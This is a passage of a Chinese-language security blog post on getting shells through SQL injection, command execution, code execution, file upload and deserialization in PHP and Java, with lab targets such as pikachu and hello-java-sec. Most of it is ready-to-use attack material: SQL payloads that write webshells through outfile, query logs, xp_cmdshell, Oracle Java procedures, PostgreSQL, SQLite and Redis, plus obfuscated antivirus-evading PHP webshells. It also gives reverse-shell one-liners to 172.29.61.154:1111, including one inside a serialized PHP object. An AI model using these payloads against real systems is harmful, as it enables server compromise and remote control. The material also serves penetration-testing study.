invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into outfile &#x27;C:\info.php&#x27;%23</span><br><span class="language-xml">?id=1 UNION ALL SELECT 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into dumpfile &#x27;C:\info.php&#x27;%23</span><br></code></pre></td></tr></table></figure><h6 id="非联合查询"><a href="#非联合查询" class="headerlink" title="非联合查询"></a><strong>非联合查询</strong></h6><p>当我们无法使用联合查询时，我们可以使用<code>fields terminated by</code>与<code>lines terminated by</code>来写shell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 into outfile &#x27;C:\info.php&#x27; FIELDS TERMINATED BY &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br></code></pre></td></tr></table></figure><p><strong>代替空格的方法</strong><br>+号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、 &#x2F;**&#x2F; 注释符等<br><code>outfile</code>和<code>dumpfile</code>的区别</p><p><code>outfile</code>:</p><blockquote><p>1、 支持多行数据同时导出</p><p>2、 使用union联合查询时，要保证两侧查询的列数相同</p><p>3、 会在换行符制表符后面追加反斜杠</p><p>4、会在末尾追加换行</p></blockquote><p><code>dumpfile</code>:</p><blockquote><p>1、 每次只能导出一行数据</p><p>2、 不会在换行符制表符后面追加反斜杠</p><p>3、 不会在末尾追加换行</p></blockquote><p>因此，我们可以使用<code>into dumpfile</code>这个函数来顺利写入二进制文件;</p><p>当然<code>into outfile</code>函数也可以写入二进制文件，只是最终无法生效罢了（追加的反斜杠会使二进制文件无法生效）</p><p>如果服务器端本身的查询语句，结果有多行，但是我们又想使用<code>dump file</code>，应该手动添加 limit 限制</p><h4 id="突破secure-file-priv写shell"><a href="#突破secure-file-priv写shell" class="headerlink" title="突破secure-file-priv写shell"></a>突破<code>secure-file-priv</code>写shell</h4><p><code>MySQL</code>的<code>secure-file-priv</code>参数是用来限制LOAD DATA, SELECT … <code>OUTFILE</code>, and LOAD_FILE()传到哪个指定目录的。</p><p>当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>MySQL</code>的导入|导出做限制，如果是null，表示<code>MySQL</code>不允许导入导出。</p><p>而且在<code>mysql 5.6.34</code>版本以后 <code>secure_file_priv</code> 的值默认为NULL。并且无法用<code>SQL</code>语句对其进行修改。</p><h4 id="基于日志写shell"><a href="#基于日志写shell" class="headerlink" title="基于日志写shell"></a><strong>基于日志写shell</strong></h4><p>（ <code>outfile</code>被禁止，或者写入文件被拦截，没写权限 ，有root权限）</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">show variables like &#x27;%general%&#x27;;--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="language-xml">set global general_log = on;--开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="language-xml">set global general_log_file = &#x27;/var/www/html/info.php&#x27;;--设置日志路径</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;--执行查询，写入shell</span><br><span class="language-xml">--结束后，恢复日志路径，关闭日志监测</span><br><span class="language-xml"></span><br><span class="language-xml">--SQL查询免杀shell</span><br><span class="language-xml">select &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$sl</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;&#x27;</span>, @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;klion&#x27;</span>]);<span class="hljs-variable">$sl</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br><span class="language-xml"></span><br><span class="language-xml">SELECT &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;f&#x27;</span>=&gt;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;pffff&#x27;</span>=&gt;<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>=&gt;<span class="hljs-string">&#x27;fffff&#x27;</span>,<span class="hljs-string">&#x27;lfaaaa&#x27;</span>=&gt;<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;nnnnn&#x27;</span>=&gt;<span class="hljs-string">&#x27;t&#x27;</span>);<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">array_keys</span>(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;pffff&#x27;</span>].<span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>];<span class="hljs-variable">$_</span>= <span class="hljs-string">&#x27;a&#x27;</span>.<span class="hljs-variable">$_</span>.<span class="hljs-string">&#x27;rt&#x27;</span>;<span class="hljs-variable">$_</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]));<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;;</span><br></code></pre></td></tr></table></figure><h4 id="慢查询写shell"><a href="#慢查询写shell" class="headerlink" title="慢查询写shell"></a>慢查询写shell</h4><p>为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错<br>show variables like ‘%slow_query_log%’;–查看慢查询信息<br>set global slow_query_log&#x3D;1;–启用慢查询日志(默认禁用)<br>set global slow_query_log_file&#x3D;’C:\phpStudy\WWW\shell.php’;–修改日志文件路径<br>select ‘<?php @eval($_POST[abc]);?>‘ or sleep(11);–写shell</p><h5 id="慢查询补充"><a href="#慢查询补充" class="headerlink" title="慢查询补充"></a><strong>慢查询补充</strong></h5><p>因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。</p><p>一般都是通过<code>long_query_time</code>选项来设置这个时间值，时间以秒为单位，可以精确到微秒。</p><p>如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%long_query_time%&#x27;</span><span class="hljs-comment">--查看服务器默认时间值</span><br></code></pre></td></tr></table></figure><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<br><span class="hljs-keyword">select</span> <span class="hljs-number">0x3c3f70687020a6576616c28245f504f53545b615d293ba3f3e</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/1.php&#x27;</span><br><br><span class="hljs-keyword">Sql</span> server<br>存储过程xp_cmdshell<br>;<span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; D:\\WWW\\2333.aspx&#x27;</span> ;<span class="hljs-comment">--</span><br><br>Oracle<br><span class="hljs-number">1</span>、创建JAVA包<br><span class="hljs-keyword">select</span> dbms_xmlquery.newcontext(<span class="hljs-string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;&#x27;;commit;end;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br><span class="hljs-number">2</span>、JAVA权限<br><span class="hljs-keyword">select</span> dbms_xmlquery.newcontext(<span class="hljs-string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;begin dbms_java.grant_permission( &#x27;&#x27;&#x27;&#x27;SYSTEM&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;SYS:java.io.FilePermission&#x27;&#x27;&#x27;&#x27;, &#x27;&#x27;&#x27;&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;&#x27;&#x27;&#x27;,&#x27;&#x27;&#x27;&#x27;EXECUTE&#x27;&#x27;&#x27;&#x27;);end;&#x27;&#x27;commit;end;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br><span class="hljs-number">3</span>、创建函数<br><span class="hljs-keyword">select</span> dbms_xmlquery.newcontext(<span class="hljs-string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="hljs-keyword">from</span> dual;<br>URL执行<br>id<span class="hljs-operator">=</span><span class="hljs-number">602</span><span class="hljs-string">&#x27;||utl_inadd.get_host_name((select LinxRUNCMD(&#x27;</span>cmd <span class="hljs-operator">/</span>c dir d:<span class="hljs-operator">/</span><span class="hljs-string">&#x27;) from dual))--</span><br><span class="hljs-string"></span><br><span class="hljs-string">postgresql</span><br><span class="hljs-string">COPY (select &#x27;</span><span class="hljs-operator">&lt;</span>?php phpinfo();?<span class="hljs-operator">&gt;</span><span class="hljs-string">&#x27;) to &#x27;</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span><span class="hljs-number">1.</span>php<span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">sqlite3</span><br><span class="hljs-string">;attach database &#x27;</span>D:\\www\\<span class="hljs-number">008.</span>php<span class="hljs-string">&#x27; as tt;create TABLE tt.exp (dataz text) ; insert INTO tt.exp (dataz) VALUES (x&#x27;</span><span class="hljs-number">3</span>c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e<span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">redis</span><br><span class="hljs-string">%0D%0Aconfig%20set%20dir%20%2Fvar%2Fwww%2Fhtml2F%0D%0Aconfig%20set%20dbfilename%20shell%2Ephp%0D%0Aset%20x%2022%3C%3Fphp%20phpinfo%28%29%3B%%203F%3E%22%0D%0Asave%0D%0A</span><br></code></pre></td></tr></table></figure><p>当然如果你懒得手动打，你直接sqlmap后面加个–os-shell就行</p><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>java代码审计第一步，看pom.xml，看看它用的是什么数据库交互工具，是jdbc，还是mybatis，又或是冷门点的Hibernate等<br>针对不同的交互工具，我们要查询的点也不一样<br>例如针对jdbc，我们可能就要找createStatement()，executeQuery()<br>针对mybatis，我们第一时间想到的肯定是有没有预编译，直接找${，如果是用的#{，它有没有做错误的预编译，是否存在ordey by注入，like注入等等<br>然后我们要去找它们的拼接点如：+，append()，concat()，join()等等<br>因为这里只是进行简单的学习，我们就针对hello-java这一靶场最简单的sql注入漏洞处进行分析<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808057.png" alt="image.png"><br>找到SQLI中的JDBC<br>经典的jdbcsql注入<br>这是一个字符型的sql注入，因为id被两个<code>&#39;</code>包裹了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808108.png" alt="image.png"><br>我们在web端能够直接点击run<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808258.png" alt="image.png"><br>可以直接看到漏洞点，具体的漏洞利用方式，跟php大同小异</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>这里因为没怎么听说过java命令执行(好像就是没有直接的)，所以只从php角度出发</p><h3 id="php-1"><a href="#php-1" class="headerlink" title="php"></a>php</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808942.png" alt="image.png"><br>一样的，从代码触发，很明显能看到，shell_exec，典型的命令执行函数，会直接调用外部程序去处理内容，我们只需要通过连接符&amp;进行连接，就能做到ping的同时执行我们想要的命令<br>此处payload:127.0.0.1 &amp; whoami<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808938.png" alt="image.png"><br>当然，我们可以用别的方式进行拼接<br>Windows系统：</p><ul><li>|：只执行后面的语句。</li><li>||：如果前面的语句执行失败，则执行后面的语句。</li><li>&amp;：两条语句都执行，如果前面的语句为假则执行后面的语句，如果前面的语句为真则不执行后面的语句。</li><li>&amp;&amp;：如果前面的语句为假，则直接出错，也不再执行后面的语句；前面的语句为真则两条命令都执行，前面的语句只能为真。</li></ul><p>Linux系统：</p><ul><li>;：执行完前面的语句再执行后面的语句，当有一条命令执行失败时，不会影响其它语句的执行。</li><li>|（管道符）：只执行后面的语句。</li><li>||（逻辑或）：只有前面的语句执行出错时，执行后面的语句。</li><li>&amp;（后台任务符）：两条语句都执行，如果前面的语句为假则执行后面的语句，如果前面的语句为真则不执行后面的语句。</li><li>&amp;&amp;（逻辑与）：如果前面的语句为假则直接出错，也不再执行后面的语句；前面的语句为真则两条命令都执行，前面的语句只能为真。（命令替换）：当一个命令被解析时，它首先会执行反引号之间的操作。例 echo whoami</li></ul><p>最后再对常见的php命令执行函数进行补充<br>system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()&#x2F;proc_popen()，反引号 ``<br>这个getshell手法就简单很多，写个反弹shell什么的<br>|  &#x2F;bin&#x2F;sh -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.29.61.154&#x2F;1111 0&gt;&amp;1<br>例如这个<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808500.png" alt="image.png"></p><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><h3 id="php-2"><a href="#php-2" class="headerlink" title="php"></a>php</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808475.png" alt="image.png"><br>eval，一句话常用的函数，把括号里面内容按照php代码处理<br>例如最简单的，eval(“system(‘whoami’);”);<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808690.png" alt="image.png"><br>个人理解就是可以调用命令执行的函数，从而实现执行一些敏感的系统命令操作，也比较简单，这里再总结下一些常见代码执行函数<br>eval()，assert()，call_user_func()，create_function()，array_map()，call_user_func_array()，array_filter()，uasort()，preg_replace()</p><h3 id="java-1"><a href="#java-1" class="headerlink" title="java"></a>java</h3><p>Java.lang.Runtime，Java.lang.ProcessBuilder，Java.lang.UNIXProcess&#x2F;Processlmpl<br>这里从runtime进行分析<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808838.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808237.png" alt="image.png"><br>主要就是看这个exec</p><table><thead><tr><th>方法</th><th>英文释义</th><th>中文释义（非标准）</th></tr></thead><tbody><tr><td>exec(String[] cmdarray)</td><td>Executes the specified command and arguments in a separate process.</td><td>在单独的进程中执行指定的命令和参数。</td></tr><tr><td>exec(String command)</td><td>Executes the specified string command in a separate process.</td><td>在单独的进程中执行指定的字符串命令。</td></tr><tr><td>exec(String command, String[] envp, File dir)</td><td>Executes the specified string command in a separate process with the specified environment and working directory.</td><td>在具有指定环境和工作目录的单独进程中执行指定的字符串命令。</td></tr><tr><td>exec(String command, String[] envp)</td><td>Executes the specified string command in a separate process with the specified environment.</td><td>在具有指定环境的单独进程中执行指定的字符串命令。</td></tr><tr><td>exec(String[] cmdarray, String[] envp)</td><td>Executes the specified command and arguments in a separate process with the specified environment.</td><td>在具有指定环境的单独进程中执行指定的命令和参数。</td></tr><tr><td>exec(String[] cmdarray, String[] envp, File dir)</td><td>Executes the specified command and arguments in a separate process with the specified environment and working directory.</td><td>在具有指定环境和工作目录的单独进程中执行指定的命令和参数。</td></tr></tbody></table><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="php-3"><a href="#php-3" class="headerlink" title="php"></a>php</h3><p>pikachu中的upload代码有点臃肿，看起来有点费劲，这里选择菜鸟教程<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808239.png" alt="image.png"><br>可以看到php中最简单的文件上传，就是通过<code>$_FILES</code>这一参数读取表单中的内容，然后把对应的数值挪到新的目录中</p><h3 id="java-2"><a href="#java-2" class="headerlink" title="java"></a>java</h3><p>java上传的马是jsp<br>但是在springboot中，我们需要引入依赖才会解析jsp</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--用于编译jsp--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808410.png" alt="image.png"><br>我认为找文件上传，其实都是要找文件上传的功能点，再看它有没有黑名单白名单，内容过滤什么的<br>所以这里只指出java文件上传的函数<br>Multipartfile，ServletFileUpload</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="php-4"><a href="#php-4" class="headerlink" title="php"></a>php</h3><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808001.png" alt="image.png"><br>学习php反序列化，我们就要学习它的魔术方法</p><ul><li>__construct() 类的构造函数,每次创建新对象时先调用此方法</li><li>__destruct() 类的析构函数,某个对象的所有引用都被删除或者销毁时调用</li><li>__call() 在对象中调用一个不可访问方法时调用</li><li>__callStatic() 用静态方式中调用一个不可访问方法时调用</li><li>__get() 获得一个类的成员变量时调用</li><li>__set() 设置一个类的成员变量时调用</li><li>__isset() 当对不可访问属性调用isset()或empty()时调用</li><li>__unset() 当对不可访问属性调用unset()时被调用。</li><li>__sleep() 执行serialize()时，先会调用这个函数</li><li>__wakeup() 执行unserialize()时，先会调用这个函数</li><li>__toString() 类被当成字符串时的回应方法</li><li>__invoke() 调用函数的方式调用一个对象时的回应方法</li><li>__set_state() 调用var_export()导出类时，此静态方法会被调用。</li><li>__clone() 当对象复制完成时调用</li><li>__autoload() 尝试加载未定义的类</li><li>__debugInfo() 打印所需调试信息</li><li>__serialize()，执行serialize()时，先会调用这个函数(这个和__sleep()的区别后面会详细介绍)</li><li>__unserialize()，执行unserialize()时，先会调用这个函数(这个和__wakeup()的区别后面会详细介绍)</li></ul><p>至于getshell，我们写一个存在反序列化漏洞的代码<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808010.png" alt="image.png"><br>再构造一个payload</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-type">VulnerableClass</span>();  <br><span class="hljs-variable">$a</span>-&gt;data = <span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.29.61.154/1111 0&gt;&amp;1&#x27;&quot;</span>;  <br><span class="hljs-variable">$ser</span>=serialize(<span class="hljs-variable">$a</span>);  <br>echo <span class="hljs-variable">$ser</span>.PHP_EOL;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808503.png" alt="image.png"></p><h3 id="java-3"><a href="#java-3" class="headerlink" title="java"></a>java</h3><p>java反序列化主要找三个函数<br>readobject，SnakeYaml，XMLDecoder<br>hello-java-sec的我觉得不是很能明显的感受反序列化，这里用别的小例子<br>首先，我们要创建一个对象，并且继承自序列化方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo1;  <br>  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HackInfo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable&#123;  <br>    <span class="hljs-keyword">public</span> String id;  <br>    <span class="hljs-keyword">public</span> String team;  <br>  <br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们可以新建一个对象，并把它序列化成字节序列</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo1;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileOutputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializeDemo</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String [] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>  <br>        <span class="hljs-type">HackInfo</span> <span class="hljs-variable">hack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HackInfo</span>();  <br>        hack.id = <span class="hljs-string">&quot;suuuu&quot;</span>;  <br>        hack.team = <span class="hljs-string">&quot;suuuu&quot;</span>;  <br>  <br>        <span class="hljs-comment">//将序列化后的字节序列写到serializedata.txt文件中  </span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;C:\\Users\\m1371\\Desktop\\serializedata.txt&quot;</span>);  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOut);  <br>        System.out.println(out);  <br>        out.writeObject(hack);  <br>        out.close();  <br>        fileOut.close();  <br>        System.out.println(<span class="hljs-string">&quot;序列化的数据已经保存在了serializedata.txt文件中&quot;</span>);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们可以把这个字节序列在输入到别的主机上，从而将字节序列反序列化成对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo1;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DeserializeDemo</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>  <br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileIn</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;C:\\Users\\m1371\\Desktop\\serializedata.txt&quot;</span>);  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileIn);  <br>        <span class="hljs-type">HackInfo</span> <span class="hljs-variable">hack</span> <span class="hljs-operator">=</span> (HackInfo) in.readObject();  <br>        in.close();  <br>        fileIn.close();  <br>  <br>        System.out.println(<span class="hljs-string">&quot;反序列化恢复字节序列为对象...&quot;</span>);  <br>        System.out.println(<span class="hljs-string">&quot;Name: &quot;</span> + hack.id);  <br>        System.out.println(<span class="hljs-string">&quot;Address: &quot;</span> + hack.team);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411081808302.png" alt="image.png"><br>那么怎么样的反序列化才能rce呢，这里我们只需要对第一个文件进行一下修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> demo1;  <br>  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HackInfo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable&#123;  <br>    <span class="hljs-keyword">public</span> String id;  <br>    <span class="hljs-keyword">public</span> String team;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <br>        in.defaultReadObject();  <br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);  <br>        &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这时候我们再序列化，再反序列化，就能实现rce</p>]]></content>
    
    
    <categories>
      
      <category>getshell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>getshell</tag>
      
      <tag>top10</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulntarget-a</title>
    <link href="/2024/11/11/Vulntarget-a/"/>
    <url>/2024/11/11/Vulntarget-a/</url>
    
